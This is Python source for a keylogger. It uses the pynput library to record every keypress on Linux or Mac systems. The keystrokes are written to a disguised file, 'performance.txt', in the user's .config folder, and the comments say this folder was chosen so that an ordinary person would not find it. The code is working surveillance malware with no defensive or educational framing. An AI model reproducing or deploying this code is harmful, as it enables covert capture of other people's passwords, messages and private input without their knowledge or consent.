import os;
import sys;
from typing import *;
from pynput.keyboard import Listener, Key;

HOMEPATH: str = ""
KEYS: List[Key] = []
COUNT: int = 0

def main():
    with Listener(on_press=keyPress) as listener:
        listener.join()

def keyPress(key: Key) -> None:
    """
    Function to deal with keys being pressed when listener captures them
    """
    global KEYS, COUNT
    KEYS.append(key)
    COUNT += 1
    if COUNT >= 1: # if we have more than one key in our KEYS array then we write
        COUNT = 0 # reset count
        writeKey(KEYS);
        KEYS = [] # reset KEYS array

def writeKey(keys: List[Key]) -> None:
    """ 
    This will write keys to a file that is created
    but checking what OS we are on to create the file accordingly
    the plan is to create the file in a folder that a normal
    person will not check in
    """
    global HOMEPATH
    if os.name == "posix": # We are on a Linux or Mac sytem
        HOMEPATH = "/home/"
        try:
            username = os.getlogin() + "/" # We will try to get their username
            path: str = searchFile(HOMEPATH + username, ".config") # We will look for .config folder
            if (path is None): # .config was not found then we will make one
                try:
                    os.makedirs(HOMEPATH + username + ".config")
                    path = HOMEPATH + username + ".config"
                except OSError as e:
                    print(f"Failed to create folder: {e}")
                    sys.exit(1)
            with open(path + "/performance.txt", "a") as keyFile:
                for key in keys:
                    k = str(key).replace("'", "") # Replace quotes that come with keys
                    if k.find("space") > 0:
                        keyFile.write("\n")
                    if k.find("Key") == -1: # Check if it is a special key
                        keyFile.write(k)
        except Exception:
            sys.exit(1)

def searchFile(start: str, target: str) -> Union[str, None]:
    """
    Function to search if a file or folder exists in order to check
    for the existence of the .config file to store keylogs
    """
    for root, dir, file in os.walk(start):
        if target in file or target in dir:
            return os.path.join(root, target)
    return None

if __name__ == "__main__":
    main()